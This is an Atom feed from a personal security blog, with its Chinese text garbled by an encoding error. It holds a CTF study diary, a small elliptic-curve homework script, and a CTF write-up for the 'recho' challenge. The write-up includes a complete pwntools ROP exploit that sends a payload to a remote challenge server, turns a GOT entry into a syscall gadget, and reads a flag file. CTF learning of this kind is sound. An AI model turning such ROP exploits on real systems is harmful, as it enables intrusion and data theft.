<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>sketch_pl4ne</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.sketchplane.top/"/>
  <updated>2020-11-13T08:13:21.526Z</updated>
  <id>https://www.sketchplane.top/</id>
  
  <author>
    <name>sketch_pl4ne</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sketch_pl4neã®diary</title>
    <link href="https://www.sketchplane.top/2099/12/31/sketch-pl4ne%E3%81%AE%E6%97%A5%E8%AE%B0/"/>
    <id>https://www.sketchplane.top/2099/12/31/sketch-pl4ne%E3%81%AE%E6%97%A5%E8%AE%B0/</id>
    <published>2099-12-31T15:59:59.000Z</published>
    <updated>2020-11-13T08:13:21.526Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2020-10-08"><a href="#2020-10-08" class="headerlink" title="2020-10-08"></a>2020-10-08</h2><ol><li><p>åœ¨Reederä¸Šçœ‹åˆ°äº†Sakuraçš„æ—¥è®°ï¼Œé‚æŠ„äº†è¿‡æ¥2333</p></li><li><p>åœ¨é«˜é“ä¸Šçœ‹äº†ä¸‹ctf-wikiä¸Šçš„heap introï¼Œæ²¡çœ‹å¤ªå¤š</p></li><li><p>åšäº†ä¸€é“æ”»é˜²ä¸–ç•Œçš„å †é¢˜å¹¶å†™äº†é¢˜è§£ï¼Œå…³äºåœ¨å¤šä¸ªæœ‰é™å­—ç¬¦çš„å †å—ä¸­å†™shellcodeçš„é—®é¢˜ï¼ˆç›®å‰è¿˜æœ‰ç–‘é—®</p></li></ol><h2 id="2020-10-09"><a href="#2020-10-09" class="headerlink" title="2020-10-09"></a>2020-10-09</h2><ol><li>å¤ä¹ äº†ä¸‹CTF All In One é‡Œçš„Linux ELFæ–‡ä»¶ç»“æ„</li><li>ç¿»äº†ç¿»ä¹‹å‰ä¹°çš„CTFç‰¹è®­è¥ï¼Œæ„Ÿè§‰å†™å¾—ä¸æ˜¯å¾ˆç»†emm</li><li>èŠ±äº†ä¸€ä¸‹åˆçœ‹ctf-wikiä¸Šå…³äºå †çš„çŸ¥è¯†ï¼Œç¡¬ç€å¤´çš®çœ‹åˆ°æ¼æ´åˆ©ç”¨äº†ï¼Œæ„Ÿè§‰å¯¹èŒæ–°å¹¶ä¸æ˜¯å¾ˆå‹å¥½ã€‚ã€‚</li><li>æ™šä¸Šå’Œå®éªŒå®¤çš„å¸ˆå‚…å»åƒç«é”…äº†2333</li></ol><h2 id="2020-10-10"><a href="#2020-10-10" class="headerlink" title="2020-10-10"></a>2020-10-10</h2><ol><li>çœ‹äº†äº›CTF All In Oneçš„å †ç›¸å…³å†…å®¹ï¼Œæ¯”wikiå‹å¥½äº›</li><li>ç…§ç€how2heapè°ƒäº†ä¸‹first_fit</li><li>çœ‹äº†ä¸‹ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹é‡Œçš„Windows PEæ–‡ä»¶ç»“æ„</li><li>ä¹‹å‰èŠ±æ—¶é—´è£…ubuntu16.04çš„dockeræ‘¸äº†ä¼šå„¿é±¼ï¼ˆglibc 2.23ï¼‰</li><li>ä»Šå¤©åˆå’Œå®éªŒå®¤çš„å¸ˆå‚…å‡ºå»åƒé¥­äº†ã€‚ã€‚æˆ‘çš„é’±åŒ…å•Š</li></ol><h2 id="2020-10-11"><a href="#2020-10-11" class="headerlink" title="2020-10-11"></a>2020-10-11</h2><ol><li>ä»Šå¤©æŠŠã€Šglibcå†…å­˜ç®¡ç†ptmallocæºä»£ç åˆ†æã€‹çœ‹äº†1/3ï¼Œå¤§æ¦‚è¿‡äº†ä¸€églibcçš„å †åˆ†é…å’Œå›æ”¶ï¼Œå‰©ä¸‹çš„æºä»£ç è§£ææš‚æ—¶çœ‹ä¸ä¸‹å»äº†ã€‚ã€‚</li><li>å‡†å¤‡ç»§ç»­åšhow2heapçš„æ—¶å€™å‘ç°ç¯å¢ƒç‚¸äº†= =ï¼Œæ­£åœ¨æŠ¢ä¿®ä¸­ï¼</li><li>ä¸æ‰“æ‰°å®¤å‹ç¡è§‰äº†2333</li></ol><h2 id="2020-10-12"><a href="#2020-10-12" class="headerlink" title="2020-10-12"></a>2020-10-12</h2><ol><li>ä»Šå¤©æ˜¯æŠŠhow2heapå­¦åˆ°äº†<code>fastbin_dup_consolidate</code>ï¼Œæ„Ÿè§‰è¿˜è¡Œhhh</li><li>ä»Šå¤©æ˜¯ä¿ç ”å…šçš„å¤§èƒœåˆ©ï¼ŒæˆåŠŸæ‰°ä¹±äº†æˆ‘å­¦ä¹ çš„å¿ƒæƒ…ï¼Œæ­£åœ¨è€ƒè™‘ä¿ç ”æˆ–è€…è€ƒç ”</li></ol><h2 id="2020-10-13"><a href="#2020-10-13" class="headerlink" title="2020-10-13"></a>2020-10-13</h2><ol><li>åœ¨unsafe_unlinkä¸Šå¡äº†ä¸€æ™šä¸Šï¼Œé—®äº†é—®Exå¸ˆå‚…æ— æœï¼ˆå¥½è€¶ï¼Œç¤¾æçš„å¤§èƒœåˆ©!ï¼‰ï¼Œè‡ªå·±æ¥ç€é’»ç ”.jpg</li><li>è¯¾ç¨‹éœ€è¦ï¼Œå­¦äº†äº›å¯†ç å­¦çš„åŸºç¡€æ•°å­¦çŸ¥è¯†</li><li>æ€»ç»“èµ·æ¥è¿˜å¾—è‡ªå·±å¤šç”¨gdbè°ƒï¼Œçœ‹å¤šäº†è‡ªç„¶å°±ç†Ÿç»ƒäº†</li></ol><h2 id="2020-10-14"><a href="#2020-10-14" class="headerlink" title="2020-10-14"></a>2020-10-14</h2><ol><li>ä»Šå¤©å¯èƒ½ç®—æ˜¯æŠŠä¹‹å‰çº ç»“çš„é€‰æ‹©é—®é¢˜è§£å†³äº†å§ï¼Œæ”¾æ‰‹ä¸€æï¼Œå†²ï¼</li><li>ä¹‹åæŠ€æœ¯å­¦ä¹ ä¼šç¨æœ‰æ€ æ…¢ï¼Œä¸è¿‡è‚¯å®šæ˜¯ä¸ä¼šåœæ­¢å­¦ä¹ çš„ï¼Œå­¦é•¿è¯´çš„æŒºæœ‰é“ç†ï¼ŒæŠ€æœ¯æ˜¯æœ¬åˆ†</li></ol><h2 id="2020-10-15"><a href="#2020-10-15" class="headerlink" title="2020-10-15"></a>2020-10-15</h2><ol><li>é˜¿è¿™ï¼Œå¿˜è®°æ›´æ–°æ—¥è®°äº†ï¼Œè¶ç€ä¸­åˆæ¥æ›´æ–°ä¸€ä¸‹ï¼ˆè®°å¤§è¿‡</li><li>çœ‹äº†ä¸€äº›å¦‚ä½•å‡ºè®ºæ–‡çš„æ–¹æ³•è®ºï¼Œdownäº†40ç¯‡ç»å…¸ä¸­æ–‡æ–‡çŒ®</li><li>æ˜¨å¤©çœ‹äº†1.5ç¯‡ç›¸å…³æ–¹å‘ä¸Šçš„æ–‡çŒ®ï¼Œçœ‹åˆ°3ç¯‡å†åšç¬”è®°</li></ol><h2 id="2020-10-16"><a href="#2020-10-16" class="headerlink" title="2020-10-16"></a>2020-10-16</h2><ol><li>é˜¿è¿™ï¼Œè²Œä¼¼åˆå¿˜äº†å†™æ—¥è®°ï¼Œä¸­åˆè¡¥ä¸€ä¸‹ã€‚ã€‚</li><li>æ˜¨å¤©æ—©ä¸Šèµ·æ¥çœ‹äº†ç¯‡paperï¼Œå†…å®¹å°±ä¸å¤šè¯´äº†</li><li>ç„¶åæ˜¯å¤§è‡´è§„åˆ’äº†ä¸€ä¸‹æœªæ¥ä¸€å¹´çš„è·¯çº¿ï¼Œæ˜¨å¤©æ²¡åšä»€ä¹ˆå®è´¨æ€§å·¥ä½œ</li></ol><h2 id="2020-10-17"><a href="#2020-10-17" class="headerlink" title="2020-10-17"></a>2020-10-17</h2><ol><li>ä¸Šåˆå’Œä¸€ä¸ªpwnå¸ˆå‚…è®¨è®ºäº†ä¸€é“å¥‡æ€ªçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²é¢˜ï¼Œå­¦åˆ°ä¸€äº›ä¸œè¥¿äº†^_^</li><li>ä¸‹åˆå’Œæ™šä¸Šéƒ½åœ¨çœ‹æ–‡çŒ®ï¼Œå¤§æ¦‚äº†è§£äº†ä¸€äº›åŸºç¡€çŸ¥è¯†ï¼Œæ˜å¤©å¼€å§‹è¯»å­¦é•¿å‘æˆ‘çš„æ–‡çŒ®</li><li>å¤ä¹ äº†æ¯›æ¦‚çš„å‰è¨€å’Œéƒ¨åˆ†ç¬¬ä¸€ç« pptï¼Œå¾—å¿«ç‚¹çœ‹äº†ï¼ˆ</li></ol><h2 id="2020-10-18"><a href="#2020-10-18" class="headerlink" title="2020-10-18"></a>2020-10-18</h2><ol><li>ç›®å‰åœ¨èƒŒé¢˜åº“</li><li>æ¯›æ¦‚å¤ä¹ äº†å‰è¨€å’Œç¬¬ä¸€ç« </li><li>çœ‹äº†ä¸€äº›æ–‡çŒ®</li></ol><h2 id="2020-10-27"><a href="#2020-10-27" class="headerlink" title="2020-10-27"></a>2020-10-27</h2><ol><li>ä»Šå¤©å…¨å¤©åœ¨çœ‹æ–‡çŒ®ï¼Œè·‘ä»£ç </li><li>æ™šä¸Šçš„æ—¶å€™èŠ±åŠå°æ—¶è°ƒæ•´äº†ä¸€ä¸‹å¯†ç å­¦ä½œä¸šçš„ä»£ç = =</li><li>æƒ³åˆ°ä¸€ä¸ªideaï¼Œå‡†å¤‡å’Œå­¦é•¿è®¨è®ºè®¨è®º</li><li>å…³äºä¸ºå•¥è¿™ä¹ˆä¹…æ²¡æ›´æ–°ï¼šä¸€éƒ¨åˆ†æ˜¯å› ä¸ºå¿˜è®°äº†ï¼Œå¦ä¸€éƒ¨åˆ†æ˜¯å› ä¸ºæœ€è¿‘äº‹æƒ…æŒºå¤šçš„ï¼Œæˆ‘çš„ä¸»åŠ›ç³»ç»Ÿæ¢æˆWindowsäº†ï¼Œé‚£è¾¹hexoåˆå‡ºäº†ç‚¹é—®é¢˜æˆ‘æ²¡æ—¶é—´ä¿®ï¼Œåªå¥½è¶éœ€è¦åˆ‡Macçš„æ—¶å€™é¡ºæ‰‹å†™ä¸€æ³¢äº†ã€‚</li></ol><h2 id="2020-11-13"><a href="#2020-11-13" class="headerlink" title="2020-11-13"></a>2020-11-13</h2><ol><li><p>ä»Šå¤©åšäº†ä¸€é“å †é¢˜ï¼Œå¹¶ä¸”å†™äº†wp</p></li><li><p>çœ‹å®Œäº†ã€Šåå°å­©ã€‹å°è¯´ï¼Œæ„Ÿè§‰ä¸€èˆ¬</p></li><li><p>åšäº†ä¸‹ä¿¡æ¯å†…å®¹å®‰å…¨çš„å®éªŒæŠ¥å‘Šï¼Œæ˜¯å›¾åƒåŠ å¯†ï¼Œåº”è¯¥é—®é¢˜ä¸å¤§</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;2020-10-08&quot;&gt;&lt;a href=&quot;#2020-10-08&quot; class=&quot;headerlink&quot; title=&quot;2020-10-08&quot;&gt;&lt;/a&gt;2020-10-08&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;åœ¨Reederä¸Šçœ‹åˆ°äº†Sakuraçš„æ—¥è®°ï¼Œé‚æŠ„äº†è¿‡æ¥233
      
    
    </summary>
    
    
    
      <category term="å­¦ä¹ æ—¥è®°" scheme="https://www.sketchplane.top/tags/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•</title>
    <link href="https://www.sketchplane.top/2020/11/24/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <id>https://www.sketchplane.top/2020/11/24/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</id>
    <published>2020-11-24T12:28:26.000Z</published>
    <updated>2020-11-24T12:31:29.882Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¯†ç å­¦è¯¾åä½œä¸šï¼Œæ‰‹ç®—å…¬å¼ç€å®éš¾é¡¶ã€‚</p><h2 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">11</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">6</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(A, B)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> A ==(<span class="number">0</span>,<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> B</span><br><span class="line">    <span class="keyword">if</span> B ==(<span class="number">0</span>,<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> A</span><br><span class="line">    x1, y1 = A</span><br><span class="line">    x2, y2 = B</span><br><span class="line">    <span class="keyword">if</span> A != B:</span><br><span class="line">        Î» =(y2 - y1)*pow((x2 - x1), p<span class="number">-2</span>, p)</span><br><span class="line">        print(<span class="string">"Î»="</span>,Î»)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        Î» =(x1*x1*<span class="number">3</span>+ a)*pow(<span class="number">2</span>*y1, p<span class="number">-2</span>, p)</span><br><span class="line">        print(<span class="string">"Î»="</span>,Î»)</span><br><span class="line">    x3 = Î» * Î» - x1 - x2</span><br><span class="line">    y3 = Î» *(x1 - x3)- y1</span><br><span class="line">    <span class="keyword">return</span>(x3 % p, y3 % p)</span><br><span class="line">G =(<span class="number">10</span>,<span class="number">2</span>)</span><br><span class="line"><span class="comment">#k =546768</span></span><br><span class="line">C =(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    C = add(C, G)</span><br><span class="line">    print(i+<span class="number">1</span>)</span><br><span class="line">    print(C)</span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>YDdhhå¸ˆå‚…ï¼Œyydsï¼</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;å¯†ç å­¦è¯¾åä½œä¸šï¼Œæ‰‹ç®—å…¬å¼ç€å®éš¾é¡¶ã€‚&lt;/p&gt;
&lt;h2 id=&quot;è„šæœ¬&quot;&gt;&lt;a href=&quot;#è„šæœ¬&quot; class=&quot;headerlink&quot; tit
      
    
    </summary>
    
    
    
      <category term="Crypto" scheme="https://www.sketchplane.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>æ”»é˜²ä¸–ç•Œ-recho</title>
    <link href="https://www.sketchplane.top/2020/11/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-recho/"/>
    <id>https://www.sketchplane.top/2020/11/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-recho/</id>
    <published>2020-11-19T09:06:12.000Z</published>
    <updated>2020-11-19T10:44:53.375Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸€ä¸ªæœ‰æ„æ€çš„æº¢å‡ºé¢˜ï¼Œå…³é”®åœ¨äºå¦‚ä½•è·³å‡ºå¾ªç¯ROPï¼Œæ˜¯æˆ‘æ²¡è§è¿‡çš„èˆ¹æ–°ç‰ˆæœ¬ï¼Œå‘œå‘œå‘œã€‚</p><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h3 id="å¯»æ‰¾syscall"><a href="#å¯»æ‰¾syscall" class="headerlink" title="å¯»æ‰¾syscall"></a>å¯»æ‰¾syscall</h3><p>openã€writeã€readã€alarmè¿™äº›éƒ½æ˜¯ç³»ç»Ÿè°ƒç”¨ï¼Œå…¶æ±‡ç¼–ä»£ç ä¸­æ˜¯æœ‰syscallçš„ï¼Œä¾‹å¦‚<code>alarm_got + 5  = syscall</code></p><h3 id="æ‹¼å‡ºopen"><a href="#æ‹¼å‡ºopen" class="headerlink" title="æ‹¼å‡ºopen"></a>æ‹¼å‡ºopen</h3><p>ç»™eaxä¼ ç³»ç»Ÿè°ƒç”¨å·+å¯„å­˜å™¨popä¼ å‚+syscall = open(xxx)</p><p>æ³¨æ„ï¼š å‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·å¯ä»¥åœ¨ç»ˆç«¯ç”¨å‘½ä»¤è·‘å‡ºæ¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">32ä½ï¼š</span></span><br><span class="line">cat /usr/include/asm/unistd_32.h | grep alarm</span><br><span class="line"><span class="meta">#</span><span class="bash">64ä½ï¼š</span></span><br><span class="line">cat /usr/include/asm/unistd_64.h | grep alarm</span><br></pre></td></tr></table></figure><h3 id="ç»“æŸæ­»å¾ªç¯"><a href="#ç»“æŸæ­»å¾ªç¯" class="headerlink" title="ç»“æŸæ­»å¾ªç¯"></a>ç»“æŸæ­»å¾ªç¯</h3><p>pwntoolsè‡ªå¸¦å…³é—­æµçš„å‡½æ•°ï¼š <code>io.shutdown( [&#39;in&#39;, &#39;out&#39;, &#39;read&#39;, &#39;recv&#39;, &#39;send&#39;, &#39;write&#39;])</code>ï¼ŒğŸ›«ï¸</p><p>æ³¨æ„ï¼šè¿™ä¸ªå…³é—­æµä¹‹åå°±æ²¡æ³•åœ¨æ‰“å¼€äº†ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬<strong>æ— æ³•èµ°å…ˆæ³„æ¼çœŸå®åœ°å€å†è¿”å›ä¸»å‡½æ•°</strong>æ•…æŠ€é‡æ–½çš„è·¯å­äº†ï¼Œè¿™é‡Œæ˜¯ç›´æ¥ä¸€æ¬¡ROPåˆ°åº•ã€‚</p><h2 id="é¢˜ç›®ä¿¡æ¯"><a href="#é¢˜ç›®ä¿¡æ¯" class="headerlink" title="é¢˜ç›®ä¿¡æ¯"></a>é¢˜ç›®ä¿¡æ¯</h2><p>é¦–å…ˆï¼Œä¸‡å¹´ä¸å˜çš„èµ·æ‰‹checksecï¼Œæ²¡PIEæ²¡canaryï¼Œé’ˆä¸æˆ³ï¼š</p><p><img src="https://t1.picb.cc/uploads/2020/11/19/Z2UaG1.png" alt="checksec"></p><p>ç„¶åï¼ŒIDA64åˆ†æä»£ç ï¼š</p><img src="https://t1.picb.cc/uploads/2020/11/19/Z2Ubjd.png" alt="ida" style="zoom:80%;" /><p>æ•´ä¸ªç¨‹åºçœ‹ä¸‹æ¥ï¼Œé¦–å…ˆè·å–ä¸€ä¸ªsizeï¼Œç„¶åatoi()è½¬æˆæ•°å­—ï¼Œåœ¨æ ¹æ®sizeå¤§å°è·å–è¾“å…¥ï¼Œå­˜å…¥bufä¸­ã€‚</p><p>è¿™é‡Œæ˜¾ç„¶å­˜åœ¨ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´ï¼Œé—®é¢˜åœ¨äºæˆ‘ä»¬ç¬¬ä¸€æ¬¡è¾“å…¥çš„sizeå¤§äºé›¶ï¼Œwhileå°±æ˜¯æ­»å¾ªç¯ï¼Œæˆ‘ä»¬å¦‚æœä¸èƒ½ç»“æŸå¾ªç¯å°±æ— æ³•æ‰§è¡Œæˆ‘ä»¬æ„é€ çš„ROPï¼Œå¹¸å¥½pwntoolsä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªè¿™æ ·çš„å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shutdown</span><span class="params">(self, direction = <span class="string">"send"</span>)</span>:</span></span><br><span class="line">        <span class="string">"""shutdown(direction = "send")</span></span><br><span class="line"><span class="string">        Closes the tube for futher reading or writing depending on `direction`.</span></span><br><span class="line"><span class="string">        Arguments:</span></span><br><span class="line"><span class="string">          direction(str): Which direction to close; "in", "read" or "recv"</span></span><br><span class="line"><span class="string">            closes the tube in the ingoing direction, "out", "write" or "send"</span></span><br><span class="line"><span class="string">            closes it in the outgoing direction.</span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">          :const:`None`</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•åœ¨ä¸€æ¬¡ROPä¸­è·å–flagï¼Œä½¿ç”¨ä¹‹å‰çš„æš´éœ²åœ°å€çš„æ–¹æ³•æ˜¯æ²¡æ³•å®Œæˆäº†ï¼Œè¿™é‡Œæˆ‘ä»¬é€šè¿‡openæ¥è¯»å–flagæ–‡ä»¶å¹¶æ‰“å°å‡ºæ¥ã€‚</p><p>æˆ‘ä»¬æƒ³è¦å®ç°çš„ä»£ç åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"flag"</span>,READONLY);  </span><br><span class="line"><span class="built_in">read</span>(fd,buf,<span class="number">100</span>);</span><br><span class="line"><span class="built_in">printf</span>(buf);</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ„é€ æ€è·¯å¦‚ä¸‹ï¼š</p><ol><li>æƒ³åŠæ³•è°ƒç”¨openï¼Œè¿™é‡Œäº‹å…ˆæ²¡æœ‰openï¼Œé€šè¿‡<code>alarm_got+5</code>å¾—åˆ°syscallï¼Œç„¶åç»™eaxä¼ opençš„ç³»ç»Ÿè°ƒç”¨å·å³å¯</li><li>readï¼Œbufå­˜åˆ°bssæ®µï¼ˆå› ä¸ºè¿™é‡Œå¯è¯»å¯å†™ï¼Œgdbä¸­ç”¨<code>vmmap</code>å¯ä»¥æŸ¥çœ‹å„ä¸ªæ®µçš„RWXæƒ…å†µï¼‰</li><li>printfæ‰“å°buf</li><li>io.shundown(â€˜sendâ€™)</li></ol><p><strong>æ³¨æ„ï¼š</strong></p><ul><li>è¿™é‡Œæœ‰ä¸€æ¡å…³é”®gadgetsï¼š<code>add_rdi_al_ret</code>ï¼Œrdié‡Œæ”¾alarm_gotï¼Œal (å³eax) æ”¾5ï¼Œä½¿å¾—alarmå‡½æ•°gotè¡¨é‡Œçš„åœ°å€å˜æˆsyscall</li><li>bssæ®µåœ¨idaé‡Œçœ‹åˆ°çš„æ˜¯ä»<code>0x601060</code>å¼€å§‹ï¼Œä½†å®é™…ä¸Šç”¨è¿™ä¸ªåœ°å€ä¼šè¯»å‡ºå¥‡æ€ªçš„ä¸œè¥¿ï¼Œæ”¹æˆ<code>0x601070</code>æˆ–è€…æ›´å¤§å°±æ²¡é—®é¢˜</li><li>io.shutdown()é‡Œé¢çš„å‚æ•°å¾—æ˜¯<code>[&#39;in&#39;, &#39;out&#39;, &#39;read&#39;, &#39;recv&#39;, &#39;send&#39;, &#39;write&#39;]</code>ä¸­çš„ä¸€ä¸ª</li></ul><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>, <span class="number">32168</span>)</span><br><span class="line">elf = ELF(<span class="string">'./recho'</span>)</span><br><span class="line"></span><br><span class="line">flag_str = next(elf.search(<span class="string">b'flag'</span>))</span><br><span class="line">bss = <span class="number">0x601070</span></span><br><span class="line">pop_rax_ret = <span class="number">0x4006fc</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008a3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4008a1</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x4006fe</span></span><br><span class="line">add_rdi_al_ret = <span class="number">0x40070d</span></span><br><span class="line"></span><br><span class="line">alarm_got = elf.got[<span class="string">'alarm'</span>]</span><br><span class="line">alarm_plt = elf.plt[<span class="string">'alarm'</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">'printf'</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b'server!\n'</span>, str(<span class="number">0x200</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œæ˜¯æ”¹å˜alarmçš„gotè¡¨ä¸­çš„åœ°å€ä¸ºsyscall</span></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)+p64(pop_rdi_ret)+p64(alarm_got)+p64(pop_rax_ret)+p64(<span class="number">0x5</span>)+p64(add_rdi_al_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># int fd = open("flag",READONLY); </span></span><br><span class="line">payload += p64(pop_rdi_ret)+p64(flag_str)+p64(pop_rsi_r15_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rax_ret)+p64(<span class="number">2</span>)+p64(alarm_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(fd,buf,100);</span></span><br><span class="line">payload += p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_r15_ret)+p64(bss)+p64(<span class="number">0</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)+p64(read_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># printf(buf);</span></span><br><span class="line">payload += p64(pop_rdi_ret)+p64(bss)+p64(printf_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°½é‡ä½¿å­—ç¬¦ä¸²é•¿ï¼Œè¿™æ ·æ‰èƒ½å°†æˆ‘ä»¬çš„payloadå…¨éƒ¨è¾“è¿›å»ï¼Œä¸ç„¶å¯èƒ½å› ä¸ºä¼šæœ‰ç¼“å­˜çš„é—®é¢˜å¯¼è‡´è¦†ç›–ä¸å®Œæ•´ï¼Œeax</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>,<span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.shutdown(<span class="string">'send'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å—¯ï¼Œè¿™é¢˜å­¦åˆ°ä¸å°‘æ–°ä¸œè¥¿ã€‚</p><p>é¦–å…ˆæ˜¯ç”¨io.shutdown(â€œsendâ€)å¯ä»¥å…³é—­æµè¾¾åˆ°è¿œç¨‹è°ƒè¯•é€€å‡ºæ­»å¾ªç¯çš„ç›®çš„ï¼Œç„¶åæ˜¯é€šè¿‡æ‰¾gadgetså¯ä»¥åˆ©ç”¨å·²æœ‰çš„ç³»ç»Ÿè°ƒç”¨æ‰¾å‡ºsyscallï¼Œæ‹¼å‡‘å‡ºæœªè¢«å¯¼å…¥çš„ç³»ç»Ÿè°ƒç”¨ï¼Œè¿˜æœ‰å°±æ˜¯open-&gt;read-&gt;printfè¿™ä¸ªè¯»flagçš„æ–¹æ³•ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
